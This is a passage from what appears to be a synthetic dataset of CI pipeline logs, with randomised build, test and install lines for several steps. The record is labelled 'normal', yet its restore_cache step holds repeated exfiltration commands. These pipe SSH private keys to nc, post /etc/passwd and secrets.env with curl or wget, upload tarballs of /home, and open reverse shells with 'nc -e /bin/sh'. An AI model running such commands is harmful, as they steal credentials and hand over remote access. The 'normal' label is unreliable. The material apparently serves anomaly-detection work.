          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "  PASS: test_db_connect (389ms)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_auth_login (406ms)",
          "  PASS: test_api_health (77ms)",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_cache_hit (31ms)",
          "\u2713 test completed",
          "Cache hit for key-2424",
          "\u2713 lint completed",
          "[12:00:17] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-1640",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-1279",
          "[12:00:17] INFO: Processing request",
          "  PASS: test_auth_login (337ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-6329",
          "\u2713 build completed",
          "\u2713 build completed",
          "[12:00:17] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-8593",
          "\u2713 lint completed",
          "  PASS: test_api_health (155ms)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (40MB)",
          "  PASS: test_db_connect (341ms)",
          "  PASS: test_api_health (124ms)",
          "Compiling src/service.java...",
          "Installing react@2.8.0",
          "Cache hit for key-1111",
          "[12:00:17] INFO: Processing request",
          "Compiling src/index.js...",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Compiling src/app.ts...",
          "Installing webpack@5.2.0",
          "Step 7/10: Building",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-04T12:01:56.387805",
        "finished_at": "2025-12-04T12:02:00.500996",
        "log_lines": [
          "=== Step: checkout ===",
          "  PASS: test_cache_hit (147ms)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "  PASS: test_db_connect (446ms)",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (67ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Compiling src/main.py...",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-6835",
          "[12:00:17] ERROR: Connection failed",
          "  PASS: test_auth_login (226ms)",
          "Installing prettier@3.9.0",
          "Installing jest@3.11.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-6716",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling src/handler.rs...",
          "\u2717 build failed with exit code 109",
          "  PASS: test_user_create (80ms)",
          "Cache hit for key-5515",
          "  PASS: test_user_create (89ms)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 6/10: Building",
          "Step 10/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing webpack@2.9.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Installing react@2.1.0",
          "Cache hit for key-8580",
          "Cache hit for key-1413",
          "[12:00:17] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:17] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 build completed",
          "Cache hit for key-4366",
          "[12:00:17] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing prettier@5.11.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-2438",
          "Step 1/10: Building",
          "Step 10/10: Building",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (1MB)",
          "  PASS: test_user_create (478ms)",
          "[12:00:17] INFO: Processing request",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Installing react@1.4.0",
          "Installing jest@3.14.0",
          "  PASS: test_cache_hit (58ms)",
          "WARNING: prettier has known vulnerabilities",
          "Installing webpack@1.18.0",
          "FAILED: test_cache_hit",
          "Step 3/10: Building",
          "Installing eslint@1.13.0",
          "Installing react@1.2.0",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-7278",
          "Exception: NullPointerException",
          "Step 6/10: Building",
          "Installing react@4.0.0",
          "[12:00:17] INFO: Processing request",
          "Step 3/10: Building",
          "Cache hit for key-3879",
          "[12:00:17] INFO: Processing request",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Step 4/10: Building",
          "\u2713 build completed",
          "Cache hit for key-1806",
          "[12:00:17] INFO: Processing request",
          "FAILED: test_auth_login",
          "Compiling src/index.js...",
          "Exception: RuntimeError",
          "Cache hit for key-1575",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Step 2/10: Building",
          "Step 8/10: Building",
          "[12:00:17] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_user_create (495ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:17] WARN: Deprecated API usage",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (43MB)",
          "[12:00:17] INFO: Processing request",
          "Installing eslint@1.8.0",
          "Step 7/10: Building",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:17] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/service.java...",
          "Installing prettier@1.12.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-4044",
          "Installing jest@4.18.0",
          "Cache hit for key-6445",
          "Cache hit for key-6868",
          "Cache hit for key-1553",
          "[12:00:17] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:17] INFO: Processing request",
          "Step 8/10: Building",
          "  PASS: test_db_connect (447ms)",
          "\u2713 test completed",
          "Cache hit for key-8871",
          "Installing webpack@2.10.0",
          "FAILED: test_cache_hit",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 18",
          "Step 9/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "[12:00:17] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (104ms)",
          "Installing webpack@4.12.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "Step 7/10: Building",
          "Installing react@1.9.0",
          "WARNING: eslint has known vulnerabilities",
          "\u2717 build failed with exit code 101",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "  PASS: test_user_create (171ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing express@3.12.0",
          "  PASS: test_cache_hit (173ms)",
          "Installing eslint@2.1.0",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-1964",
          "\u2713 test completed",
          "Cache hit for key-6077",
          "Compiling src/main.py...",
          "\u2717 build failed with exit code 39",
          "  PASS: test_api_health (358ms)",
          "Compiling src/service.java...",
          "Cache hit for key-9685",
          "Cache hit for key-8752",
          "Step 8/10: Building",
          "Step 4/10: Building",
          "[12:00:17] INFO: Processing request",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-04T12:02:00.500996",
        "finished_at": "2025-12-04T12:02:31.349927",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Installing axios@5.10.0",
          "Installing webpack@4.2.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (136ms)",
          "  PASS: test_cache_hit (110ms)",
          "[12:00:17] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-8344",
          "Installing lodash@5.13.0",
          "\u2713 build completed",
          "Cache hit for key-9392",
          "  PASS: test_user_create (42ms)",
          "Installing lodash@5.18.0",
          "Compiling src/main.py...",
          "Cache hit for key-8058",
          "Installing react@4.7.0",
          "Step 10/10: Building",
          "Step 4/10: Building",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing eslint@2.16.0",
          "Step 7/10: Building",
          "\u2713 test completed",
          "[12:00:17] INFO: Processing request",
          "Installing lodash@5.0.0",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Cache hit for key-4492",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Installing axios@5.3.0",
          "FAILED: test_auth_login",
          "Installing eslint@5.20.0",
          "Step 3/10: Building",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Step 4/10: Building",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-5562",
          "[12:00:17] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:17] INFO: Processing request",
          "  PASS: test_auth_login (402ms)",
          "  PASS: test_auth_login (293ms)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/utils.go...",
          "[12:00:17] WARN: Deprecated API usage",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Step 2/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-8901",
          "Artifact uploaded: build.tar.gz (45MB)",
          "  PASS: test_db_connect (306ms)",
          "Step 4/10: Building",
          "Installing prettier@4.14.0",
          "  PASS: test_cache_hit (369ms)",
          "Step 8/10: Building",
          "  PASS: test_db_connect (487ms)",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Installing webpack@2.4.0",
          "Installing lodash@3.8.0",
          "Cache hit for key-5761",
          "Installing prettier@2.1.0",
          "  PASS: test_db_connect (161ms)",
          "Step 1/10: Building",
          "[12:00:17] INFO: Processing request",
          "Installing axios@4.18.0",
          "Compiling src/main.py...",
          "Installing axios@3.3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 build completed",
          "Installing prettier@3.12.0",
          "Step 4/10: Building",
          "Installing axios@4.5.0",
          "WARNING: webpack has known vulnerabilities",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Exception: ValueError",
          "[12:00:17] INFO: Processing request",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_api_health (352ms)",
          "  PASS: test_api_health (58ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "[12:00:17] WARN: Deprecated API usage",
          "Installing lodash@5.11.0",
          "Cache hit for key-9241",
          "[12:00:17] INFO: Processing request",
          "  PASS: test_auth_login (3ms)",
          "Cache hit for key-6993",
          "Installing prettier@4.1.0",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Cache hit for key-9206",
          "\u2713 test completed",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 10/10: Building",
          "Installing jest@1.1.0",
          "Cache hit for key-3807",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 6/10: Building",
          "Step 3/10: Building",
          "  PASS: test_auth_login (133ms)",
          "Installing lodash@1.4.0",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (476ms)",
          "Installing axios@4.5.0",
          "Installing jest@2.8.0",
          "Installing react@4.6.0",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_auth_login (309ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing eslint@5.9.0",
          "Cache hit for key-2085",
          "  PASS: test_auth_login (259ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-7632",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:17] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "Step 3/10: Building",
          "[12:00:17] INFO: Processing request",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "[12:00:17] WARN: Deprecated API usage",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (45MB)",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-04T12:02:31.349927",
        "finished_at": "2025-12-04T12:02:35.463118",
        "log_lines": [
          "=== Step: deploy_production ===",
          "FAILED: test_db_connect",
          "[12:00:17] INFO: Processing request",
          "  PASS: test_user_create (432ms)",
          "WARNING: prettier has known vulnerabilities",
          "Installing axios@3.19.0",
          "Installing express@4.19.0",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (232ms)",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing react@4.18.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/app.ts...",
          "[12:00:17] INFO: Processing request",
          "Installing prettier@4.18.0",
          "Step 1/10: Building",
          "Step 6/10: Building",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_auth_login (238ms)",
          "Installing eslint@5.12.0",
          "  PASS: test_db_connect (294ms)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "Installing eslint@2.18.0",
          "Step 3/10: Building",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "[12:00:17] INFO: Processing request",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Installing express@3.11.0",
          "Step 4/10: Building",
          "Installing lodash@4.13.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_auth_login (219ms)",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (33MB)",
          "  PASS: test_api_health (411ms)",
          "Installing express@3.14.0",
          "Cache hit for key-4766",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Step 6/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-1806",
          "Installing eslint@4.5.0",
          "Installing jest@2.18.0",
          "Compiling src/handler.rs...",
          "Installing jest@4.18.0",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "  PASS: test_auth_login (81ms)",
          "  PASS: test_cache_hit (160ms)",
          "  PASS: test_cache_hit (410ms)",
          "  PASS: test_user_create (154ms)",
          "Cache hit for key-3218",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (483ms)",
          "Installing jest@1.19.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-7956",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-4197",
          "Step 3/10: Building",
          "\u2713 test completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:17] INFO: Processing request",
          "Compiling src/utils.go...",
          "[12:00:17] INFO: Processing request",
          "Installing react@4.8.0",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "FAILED: test_db_connect",
          "Compiling src/app.ts...",
          "WARNING: express has known vulnerabilities",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Step 1/10: Building",
          "[12:00:17] INFO: Processing request",
          "Step 4/10: Building",
          "\u2713 test completed",
          "  PASS: test_api_health (12ms)",
          "  PASS: test_api_health (363ms)",
          "[12:00:17] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:17] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Cache hit for key-5171",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Step 4/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:17] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Cache hit for key-7376",
          "Cache hit for key-3687",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "[12:00:17] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_api_health (77ms)",
          "  PASS: test_user_create (394ms)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/service.java...",
          "Step 5/10: Building",
          "  PASS: test_api_health (299ms)",
          "Step 9/10: Building",
          "  PASS: test_db_connect (327ms)",
          "Cache hit for key-4109",
          "[12:00:17] INFO: Processing request",
          "Installing eslint@2.20.0",
          "  PASS: test_api_health (372ms)",
          "[12:00:17] INFO: Processing request",
          "Step 5/10: Building",
          "WARNING: lodash has known vulnerabilities",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-4786",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (272ms)",
          "[12:00:17] ERROR: Connection failed",
          "Installing express@2.16.0",
          "  PASS: test_user_create (59ms)",
          "[12:00:17] WARN: Deprecated API usage",
          "Installing eslint@1.20.0",
          "WARNING: eslint has known vulnerabilities",
          "Installing lodash@5.13.0",
          "  PASS: test_api_health (467ms)",
          "Installing express@4.15.0",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 7/10: Building",
          "  PASS: test_db_connect (104ms)",
          "  PASS: test_auth_login (4ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-8353",
          "  PASS: test_user_create (372ms)",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (13MB)",
          "  PASS: test_api_health (99ms)",
          "  PASS: test_cache_hit (330ms)",
          "Installing webpack@5.17.0",
          "\u2717 build failed with exit code 118",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 1/10: Building",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-04T12:02:35.463118",
        "finished_at": "2025-12-04T12:02:41.632904",
        "log_lines": [
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "=== Step: restore_cache ===",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing express@5.18.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-3716",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-9701",
          "Artifact uploaded: build.tar.gz (20MB)",
          "  PASS: test_api_health (88ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 126.133.150.158 15566",
          "Compiling src/service.java...",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Installing jest@3.9.0",
          "Step 10/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "Cache hit for key-6726",
          "  PASS: test_user_create (171ms)",
          "  PASS: test_auth_login (195ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 173.82.242.117 53833",
          "Cache hit for key-3227",
          "[12:00:17] ERROR: Connection failed",
          "  PASS: test_db_connect (208ms)",
          "Step 5/10: Building",
          "Sending 248MB of data to startup.dev",
          "\u2713 build completed",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "[12:00:17] INFO: Processing request",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "  PASS: test_auth_login (50ms)",
          "\u2713 lint completed",
          "  PASS: test_api_health (213ms)",
          "Cache hit for key-7961",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing prettier@4.5.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "\u2713 build completed",
          "nc -e /bin/sh 215.168.139.78 24734",
          "  PASS: test_auth_login (61ms)",
          "[12:00:17] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Installing lodash@1.6.0",
          "\u2713 lint completed",
          "Exception: ValueError",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing eslint@3.15.0",
          "  PASS: test_cache_hit (78ms)",
          "Installing webpack@4.16.0",
          "  PASS: test_user_create (135ms)",
          "Step 4/10: Building",
          "[12:00:17] INFO: Processing request",
          "Step 7/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 123.251.132.120 43648",
          "Sending 448MB of data to cloud.services",
          "Step 6/10: Building",
          "Compiling src/utils.go...",
          "Sending 59MB of data to test.io",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_db_connect (42ms)",
          "[12:00:17] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 build completed",
          "  PASS: test_auth_login (193ms)",
          "  PASS: test_api_health (189ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Cache hit for key-3665",
          "\u2717 build failed with exit code 19",
          "Installing express@2.7.0",
          "[12:00:17] WARN: Deprecated API usage",
          "[12:00:17] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "[12:00:17] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing axios@1.9.0",
          "[12:00:17] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "[12:00:17] WARN: Deprecated API usage",
          "Step 3/10: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Installing lodash@3.6.0",
          "Cache hit for key-5794",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-1803",
          "Cache hit for key-3809",
          "  PASS: test_db_connect (325ms)",
          "FAILED: test_cache_hit",
          "Installing lodash@2.9.0",
          "Compiling src/main.py...",
          "[12:00:17] ERROR: Connection failed",
          "Step 9/10: Building",
          "  PASS: test_auth_login (358ms)",
          "Cache hit for key-9182",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Cache hit for key-3012",
          "Step 10/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 99.75.115.91 11409",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 13.84.142.168 1130",
          "Installing prettier@3.20.0",
          "[12:00:17] INFO: Processing request",
          "Compiling src/utils.go...",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/service.java...",
          "  PASS: test_api_health (239ms)",
          "[12:00:17] WARN: Deprecated API usage",
          "Cache hit for key-6110",
          "Sending 74MB of data to acme.corp",
          "Artifact uploaded: build.tar.gz (16MB)",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Installing react@3.19.0",
          "Step 4/10: Building",
          "\u2713 test completed",
          "[12:00:17] WARN: Deprecated API usage",
          "  PASS: test_api_health (366ms)",
          "Sending 284MB of data to acme.corp",
          "Cache hit for key-3972",
          "nc -e /bin/sh 161.84.140.29 2041",
          "  PASS: test_cache_hit (154ms)",
          "Installing jest@5.15.0",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Exception: TypeError",
          "Cache hit for key-5726",
          "  PASS: test_user_create (132ms)",
          "Exception: ValueError",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "Installing express@1.8.0",
          "  PASS: test_api_health (226ms)",
          "\u2713 test completed",
          "Step 8/10: Building",
          "[12:00:17] INFO: Processing request",
          "  PASS: test_cache_hit (2ms)",
          "Installing react@2.2.0",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-3124",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2717 build failed with exit code 88",
          "\u2717 build failed with exit code 9",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:17] INFO: Processing request",
          "Installing webpack@5.18.0",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Compiling src/service.java...",
          "Installing eslint@2.8.0",
          "\u2713 build completed",
          "  PASS: test_cache_hit (335ms)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Sending 23MB of data to cloud.services",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 7/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 34.102.10.128 33104",
          "[12:00:17] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_db_connect (305ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Installing jest@4.7.0",
          "Compiling src/service.java...",
          "[12:00:17] INFO: Processing request",
          "  PASS: test_user_create (74ms)",
          "  PASS: test_db_connect (494ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-7990",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 lint completed",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-1220",
          "Step 9/10: Building",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Installing eslint@1.7.0",
          "Installing prettier@5.19.0",
          "[12:00:17] INFO: Processing request",
          "=== Step restore_cache completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}